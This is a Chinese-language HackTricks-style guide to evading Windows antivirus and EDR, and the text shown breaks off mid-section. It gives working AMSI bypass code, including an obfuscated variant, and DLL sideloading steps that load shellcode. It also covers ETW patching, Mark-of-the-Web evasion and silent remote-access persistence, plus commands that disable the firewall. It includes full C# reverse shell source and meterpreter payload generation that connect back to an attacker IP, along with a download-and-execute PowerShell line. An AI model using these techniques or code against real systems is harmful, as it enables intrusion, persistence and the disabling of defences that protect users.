# 杀毒软件 (AV) 绕过

{{#include ../banners/hacktricks-training.md}}

**本页作者为** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## 停止 Defender

- [defendnot](https://github.com/es3n1n/defendnot)：用于停止 Windows Defender 正常工作的工具。
- [no-defender](https://github.com/es3n1n/no-defender)：用于通过伪装成另一个 AV 来停止 Windows Defender 正常工作的工具。
- [如果你是管理员，禁用 Defender](basic-powershell-for-pentesters/README.md)

## **AV 绕过方法论**

目前，AV 会使用不同的方法来判断文件是否为恶意：静态检测、动态分析，以及对于更高级的 EDR，则会有行为分析。

### **静态检测**

静态检测通过在二进制或脚本中标记已知的恶意字符串或字节序列来实现，同时也会从文件本身提取信息（例如：文件描述、公司名称、数字签名、图标、校验和等）。这意味着使用已知的公开工具更容易被发现，因为它们很可能已经被分析并标记为恶意。有几种方法可以绕过这类检测：

- **Encryption**

如果你对二进制进行加密，AV 将无法检测到你的程序，但你需要某种 loader 来在内存中解密并运行程序。

- **Obfuscation**

有时只需要更改二进制或脚本中的一些字符串就能通过 AV，但这可能是一件耗时的工作，具体取决于你要混淆的内容。

- **Custom tooling**

如果你开发自己的工具，就不会有已知的恶意签名，但这需要大量时间和精力。

> [!TIP]
> 检查 Windows Defender 静态检测的一个好办法是 [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck)。它基本上把文件拆分成多个片段，然后让 Defender 单独扫描每个片段，这样可以准确告诉你二进制中哪些字符串或字节被标记。

强烈建议你查看这个关于实用 AV 绕过的 [YouTube 播放列表](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)。

### **动态分析**

动态分析是指 AV 在沙箱中运行你的二进制并监视恶意活动（例如：尝试解密并读取浏览器密码、对 LSASS 执行 minidump 等）。这部分可能更难处理，但你可以通过以下方法来规避沙箱。

- **Sleep before execution** 这取决于实现方式，但通常是绕过 AV 动态分析的好方法。AV 在扫描文件时为了不打断用户工作流，会有很短的时间窗口，所以使用较长的休眠可以干扰二进制的分析。问题是，许多 AV 的沙箱可以根据实现方式直接跳过休眠。
- **Checking machine's resources** 通常沙箱可用的资源很少（例如 < 2GB RAM），否则会拖慢用户机器。你也可以在这方面非常有创意，比如检查 CPU 温度或风扇转速，沙箱未必实现所有这些检测。
- **Machine-specific checks** 如果你想针对加入了 "contoso.local" 域的用户工作站，可以检查计算机的域名是否匹配指定的域，如果不匹配，就让程序退出。

事实证明，Microsoft Defender 的 Sandbox 主机名是 HAL9TH，因此在引爆前可以检查计算机名；如果匹配 HAL9TH，说明你在 Defender 的沙箱内，可以让程序退出。

<figure><img src="../images/image (209).png" alt=""><figcaption><p>来源： <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

以下是 [@mgeeky](https://twitter.com/mariuszbit) 提供的一些对抗沙箱的非常好的建议

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev 频道</p></figcaption></figure>

如本帖前文所述，**public tools** 最终会被**检测到**，所以你应该问自己：

例如，如果你想转储 LSASS，**你真的需要使用 mimikatz 吗**？或者你是否可以使用一个较少人知道但也能转储 LSASS 的其他项目。

正确的答案很可能是后者。以 mimikatz 为例，它可能是 AV 和 EDR 标记最多的恶意软件之一，尽管该项目本身很酷，但要用它来绕过 AV 会非常痛苦，所以就为你想要实现的目标寻找替代方案吧。

> [!TIP]
> 在为绕过而修改 payload 时，确保在 Defender 中**关闭自动提交样本**，并且请务必**不要上传到 VIRUSTOTAL**，如果你的目标是实现长期绕过。如果你想检查某个 AV 是否会检测到你的 payload，建议在 VM 上安装该 AV，尝试关闭自动提交样本，并在那里测试直到你满意为止。

## EXEs 与 DLLs

只要可能，始终**优先使用 DLL 来进行绕过**。根据我的经验，DLL 文件通常**被检测和分析的程度要低得多**，因此在某些情况下（如果你的 payload 有办法作为 DLL 运行）这是一个非常简单而有效的规避技巧。

正如我们在这张图中所看到的，Havoc 的一个 DLL Payload 在 antiscan.me 上的检测率为 4/26，而 EXE payload 的检测率为 7/26。

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me 上 普通 Havoc EXE payload 与 普通 Havoc DLL 的比较</p></figcaption></figure>

下面我们将展示一些可以与 DLL 文件结合使用以提高隐蔽性的技巧。

## DLL Sideloading & Proxying

**DLL Sideloading** 利用加载器使用的 DLL 搜索顺序，通过将受害应用程序和恶意 payload(s) 放在一起实现。

你可以使用 [Siofra](https://github.com/Cybereason/siofra) 和下面的 powershell 脚本来检查可能易受 DLL Sideloading 影响的程序：
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
该命令会输出位于 "C:\Program Files\\" 中易受 DLL hijacking 的程序列表，以及它们尝试加载的 DLL 文件。

我强烈建议你 **explore DLL Hijackable/Sideloadable programs yourself**，如果正确操作，这项技术相当隐蔽，但如果使用公开已知的 DLL Sideloadable programs，可能很容易被发现。

仅仅放置一个与程序期望加载名称相同的恶意 DLL 并不会自动执行你的 payload，因为程序期望该 DLL 内包含某些特定函数。为了解决这个问题，我们会使用另一种称为 **DLL Proxying/Forwarding** 的技术。

**DLL Proxying** 将程序发出的调用从代理（及恶意）DLL 转发到原始 DLL，从而保留程序功能并能够处理 payload 的执行。

我将使用来自 [@flangvik](https://twitter.com/Flangvik/) 的 [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) 项目。

以下是我遵循的步骤：
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
最后一条命令会给我们两个文件：一个 DLL 源代码模板，和原始重命名的 DLL。

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
These are the results:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

我们的 shellcode（通过 [SGN](https://github.com/EgeBalci/sgn) 编码）和 proxy DLL 在 [antiscan.me](https://antiscan.me) 上的 0/26 Detection rate！我会称之为成功。

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 我**强烈推荐**你观看 [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) 关于 DLL Sideloading 的内容，以及 [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE)，以更深入地了解我们讨论的内容。

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

你可以使用 Freeze 以隐蔽的方式加载并执行你的 shellcode。
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 规避只是猫捉老鼠的游戏，今天有效的方法明天可能会被检测到，因此不要只依赖于单一工具，如果可能，尽量将多种规避技术串联使用。

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Initially, AVs were only capable of scanning **files on disk**, so if you could somehow execute payloads **directly in-memory**, the AV couldn't do anything to prevent it, as it didn't have enough visibility.

The AMSI feature is integrated into these components of Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

它允许防病毒解决方案通过以未加密且未混淆的形式暴露脚本内容来检查脚本行为。

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Notice how it prepends `amsi:` and then the path to the executable from which the script ran, in this case, powershell.exe

我们没有向磁盘写入任何文件，但仍因 AMSI 在内存中被检测到。

Moreover, starting with **.NET 4.8**, C# code is run through AMSI as well. This even affects `Assembly.Load(byte[])` to load in-memory execution. Thats why using lower versions of .NET (like 4.7.2 or below) is recommended for in-memory execution if you want to evade AMSI.

有几种方法可以绕过 AMSI：

- **Obfuscation**

由于 AMSI 主要依赖静态检测，因此修改你尝试加载的脚本可能是规避检测的好方法。

然而，AMSI 具备去混淆脚本的能力，即使脚本有多层混淆，取决于混淆方式，obfuscation 可能并不是一个好的选择。这使得规避并非那么简单。尽管有时你只需更改几个变量名就可以，因此取决于脚本被标记的程度。

- **AMSI Bypass**

由于 AMSI 是通过将 DLL 加载到 powershell（以及 cscript.exe、wscript.exe 等）进程中来实现的，即便以非特权用户运行，也有可能轻易篡改它。由于 AMSI 实现中的这个缺陷，研究人员发现了多种方法来规避 AMSI 扫描。

**Forcing an Error**

强制 AMSI 初始化失败（amsiInitFailed）将导致当前进程不发起任何扫描。最初由 [Matt Graeber](https://twitter.com/mattifestation) 披露，Microsoft 已开发签名以防止其被广泛使用。
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
只需一行 powershell 代码就能使当前 powershell 进程中的 AMSI 失效。该行代码当然已被 AMSI 本身标记，因此需要做一些修改才能使用此技术。

这是我从这个 [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) 修改并采用的 AMSI bypass。
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
请记住，一旦这篇文章发布，可能会被标记，因此如果你打算保持不被发现，就不应该发布任何代码。

**Memory Patching**

该技术最初由 [@RastaMouse](https://twitter.com/_RastaMouse/) 发现，涉及查找 amsi.dll 中 "AmsiScanBuffer" 函数的地址（负责扫描用户提供的输入），并用返回 E_INVALIDARG 代码的指令覆盖它，这样实际扫描的结果将返回 0，被解释为清洁结果。

> [!TIP]
> 请阅读 [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) 以获得更详细的说明。

还有许多用于通过 powershell 绕过 AMSI 的其他技术，查看 [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) 和 [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) 以了解更多。

该工具 [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) 也会生成用于绕过 AMSI 的脚本。

**Remove the detected signature**

你可以使用诸如 **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** 和 **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** 的工具从当前进程的内存中移除检测到的 AMSI 签名。该工具通过扫描当前进程内存中的 AMSI 签名，然后用 NOP 指令覆盖它，从而有效地将其从内存中移除。

**AV/EDR products that uses AMSI**

你可以在 **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** 找到使用 AMSI 的 AV/EDR 产品列表。

**Use Powershell version 2**
如果你使用 PowerShell 版本 2，AMSI 将不会被加载，因此你可以运行脚本而不被 AMSI 扫描。你可以这样做：
```bash
powershell.exe -version 2
```
## PS 日志

PowerShell logging 是一项功能，允许记录系统上执行的所有 PowerShell 命令。对审计和故障排查很有用，但对想要规避检测的攻击者来说也是一个 **问题**。

要绕过 PowerShell logging，可以使用以下技术：

- **Disable PowerShell Transcription and Module Logging**: 可以使用像 [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) 这样的工具来实现。
- **Use Powershell version 2**: 如果使用 PowerShell version 2，AMSI 不会被加载，因此可以运行脚本而不被 AMSI 扫描。可以这样做：`powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: 使用 [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) 来生成一个没有防护的 powershell（这就是 `powerpick` from Cobal Strike 使用的方式）。


## 混淆

> [!TIP]
> 一些混淆技术依赖加密数据，这会增加二进制文件的熵，从而更容易被 AVs 和 EDRs 检测到。对此要小心，或者只对代码中敏感或需要隐藏的特定部分应用加密。

### 反混淆 ConfuserEx 保护的 .NET 二进制文件

在分析使用 ConfuserEx 2（或商业分支）的恶意软件时，通常会遇到多层保护，会阻止反编译器和沙箱。下面的工作流程可以可靠地 **还原接近原始的 IL**，随后可以在 dnSpy 或 ILSpy 等工具中反编译为 C#。

1.  抗篡改移除 – ConfuserEx 对每个 *method body* 进行加密，并在 *module* 静态构造函数 (`<Module>.cctor`) 内解密。这也会修补 PE 校验和，因此任何修改都会导致二进制崩溃。使用 **AntiTamperKiller** 定位被加密的元数据表，恢复 XOR 密钥并重写为干净的程序集：
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
输出包含 6 个抗篡改参数（`key0-key3`, `nameHash`, `internKey`），在构建自定义 unpacker 时可能有用。

2.  符号 / 控制流 恢复 – 将 *clean* 文件输入 **de4dot-cex**（de4dot 的一个支持 ConfuserEx 的分支）。
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
标志：
• `-p crx` – 选择 ConfuserEx 2 配置
• de4dot 将撤销控制流平坦化，恢复原始的命名空间、类和变量名，并解密常量字符串。

3.  代理调用剥离 – ConfuserEx 用轻量级包装器（亦称 *proxy calls*）替换直接方法调用以进一步破坏反编译。使用 **ProxyCall-Remover** 将它们移除：
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
完成此步骤后，你应能看到常见的 .NET API（如 `Convert.FromBase64String` 或 `AES.Create()`），而不是不透明的包装函数（`Class8.smethod_10`, …）。

4.  手动清理 – 在 dnSpy 中运行生成的二进制，搜索大型 Base64 数据块或 `RijndaelManaged`/`TripleDESCryptoServiceProvider` 的使用，以定位 *真实* 负载。恶意软件通常将其作为 TLV 编码的字节数组存储并在 `<Module>.byte_0` 中初始化。

上述链在无需运行恶意样本的情况下 **恢复执行流程** —— 在离线工作站上工作时很有用。

> 🛈  ConfuserEx 会生成一个名为 `ConfusedByAttribute` 的自定义属性，可用作 IOC 来自动分类样本。

#### 一行命令
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# 混淆器**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): 该项目的目标是提供 [LLVM](http://www.llvm.org/) 编译套件的开源分支，通过 [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) 和防篡改来提升软件安全性。
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator 演示如何使用 `C++11/14` 语言在编译期生成混淆代码，而无需使用任何外部工具或修改编译器。
- [**obfy**](https://github.com/fritzone/obfy): 通过 C++ 模板元编程框架添加一层混淆操作，增加想要破解应用程序的人的难度。
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz 是一个 x64 二进制混淆器，能够混淆多种不同的 PE 文件，包括：.exe、.dll、.sys
- [**metame**](https://github.com/a0rtega/metame): Metame 是一个针对任意可执行文件的简单变形（metamorphic）代码引擎。
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator 是一个基于 ROP (return-oriented programming) 的精细化代码混淆框架，面向 LLVM-supported languages。ROPfuscator 通过将常规指令转换为 ROP 链，在汇编代码层面混淆程序，从而破坏我们对正常控制流的直观理解。
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt 是用 Nim 编写的 .NET PE Crypter
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor 能将现有的 EXE/DLL 转换为 shellcode 然后加载它们

## SmartScreen & MoTW

当你从互联网下载某些可执行文件并运行它们时，可能会看到这个界面。

Microsoft Defender SmartScreen 是一种安全机制，旨在保护终端用户免于运行可能的恶意应用程序。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen 主要基于信誉机制工作，这意味着不常见下载的应用会触发 SmartScreen，从而提示并阻止终端用户执行该文件（尽管仍可通过点击 More Info -> Run anyway 来执行该文件）。

**MoTW** (Mark of The Web) 是一个名为 Zone.Identifier 的 [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)，在从互联网下载文件时自动创建，并包含文件的下载 URL。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Checking the Zone.Identifier ADS for a file downloaded from the internet.</p></figcaption></figure>

> [!TIP]
> 重要提示：用 **受信任** 签名证书签名的可执行文件 **不会触发 SmartScreen**。

防止你的 payloads 被打上 Mark of The Web 的一个非常有效的方法是将它们打包到某种容器内，例如 ISO。这是因为 Mark-of-the-Web (MOTW) **不能** 应用于 **非 NTFS** 卷。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) 是一个将 payloads 打包进输出容器以规避 Mark-of-the-Web 的工具。

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) 是 Windows 中一个强大的日志机制，允许应用程序和系统组件**记录事件**。然而，安全产品也可以使用它来监控并检测恶意活动。

类似于如何禁用（绕过）AMSI，也可以使用户态进程的 **`EtwEventWrite`** 函数立即返回而不记录任何事件。这是通过在内存中修补该函数使其立即返回来实现的，从而有效地为该进程禁用 ETW 日志记录。

你可以在 **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** 找到更多信息。


## C# Assembly Reflection

将 C# 二进制直接加载到内存中已经存在相当长时间，并且仍然是运行 post-exploitation 工具而不被 AV 捕获的一个很好的方法。

由于 payload 将直接加载到内存而不接触磁盘，我们只需要担心为整个进程修补 AMSI 即可。

大多数 C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) 已经提供了在内存中直接执行 C# assemblies 的能力，但有不同的方法来实现：

- **Fork\&Run**

这个方法涉及到**生成一个新的牺牲进程**，将你的 post-exploitation 恶意代码注入到该新进程中，执行你的恶意代码，完成后终止该新进程。此方法既有优点也有缺点。Fork and run 的优点是执行发生在我们的 Beacon implant 进程之外。这意味着如果我们的后渗透操作出现问题或被捕获，我们的 implant 存活的机会会**大得多**。缺点是你更有可能被**行为检测（Behavioural Detections）**发现。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

这是将 post-exploitation 恶意代码**注入到自身进程**的方法。通过这种方式，你可以避免创建新进程并被 AV 扫描，但缺点是如果 payload 的执行出现问题，崩溃的风险更高，导致**更大概率**丢失你的 beacon。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> 如果你想了解更多关于 C# Assembly 加载的内容，请查看这篇文章 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) 以及他们的 InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

你也可以**从 PowerShell**加载 C# Assemblies，查看 Invoke-SharpLoader (https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) 和 S3cur3th1sSh1t 的视频 (https://www.youtube.com/watch?v=oe11Q-3Akuk)。

## Using Other Programming Languages

如 [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) 中所建议的，通过让被侵入机器访问 **Attacker Controlled SMB share** 上安装的解释器环境，可以使用其他语言来执行恶意代码。

通过允许访问 SMB 共享上的 Interpreter Binaries 和环境，你可以在被侵入机器的内存中**以这些语言执行任意代码**。

该仓库指出：Defender 仍然会扫描脚本，但通过利用 Go、Java、PHP 等语言，我们有**更多灵活性来绕过静态签名**。使用这些语言的随机未混淆反向 shell 脚本进行测试已被证明是成功的。

## TokenStomping

Token stomping 是一种允许攻击者**操作访问令牌或安全产品（如 EDR 或 AV）**的技术，使其降低权限，从而进程不会终止但没有权限检查恶意活动。

为了防止这种情况，Windows 可以**阻止外部进程**获取安全进程的令牌句柄。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，很容易在受害者 PC 上部署 Chrome Remote Desktop，然后使用它接管并维持持久性：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载 MSI 文件。
2. 在受害者机上静默运行安装程序（需要管理员权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击下一步。向导将要求你授权；点击 Authorize 按钮继续。
4. 以一些调整执行给定参数：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin 参数允许在不使用 GUI 的情况下设置 pin）。

## Advanced Evasion

Evasion 是一个非常复杂的话题，有时你必须在单个系统中考虑许多不同的遥测来源，因此在成熟环境中几乎不可能完全保持不被发现。

每个环境都有其自身的强项和弱点。

我强烈建议你观看来自 [@ATTL4S](https://twitter.com/DaniLJ94) 的这次演讲，以便对更高级的 Evasion 技术有一个切入点。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

his is also another great talk from [@mariuszbit](https://twitter.com/mariuszbit) about Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**移除二进制的部分内容**直到**找出 Defender 认为是恶意的部分**并把它拆分给你。\
另一个做相同事情的工具是 [**avred**](https://github.com/dobin/avred)，并在 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) 提供在线服务。

### **Telnet Server**

直到 Windows10，所有 Windows 都自带一个可以安装的 **Telnet server**（以管理员身份）操作如下：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使它在系统启动时**启动**，并**立即运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口** (隐蔽) 并禁用 firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (你想要 bin downloads，而不是 setup)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- Enable the option _Disable TrayIcon_
- Set a password in _VNC Password_
- Set a password in _View-Only Password_

Then, move the binary _**winvnc.exe**_ and **新创建的** file _**UltraVNC.ini**_ inside the **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**警告：** 为了保持隐蔽，你必须避免以下几件事

- 不要在 `winvnc` 已经运行时再次启动它，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。可用 `tasklist | findstr winvnc` 检查它是否正在运行
- 不要在没有与之同目录的 `UltraVNC.ini` 的情况下启动 `winvnc`，否则会导致 [配置窗口](https://i.imgur.com/rfMQWcf.png) 打开
- 不要运行 `winvnc -h` 来获取帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 中:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **启动监听器** 并用以下命令 **执行** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前防御端会非常快地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
配合使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using 编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：
```csharp
64bit:
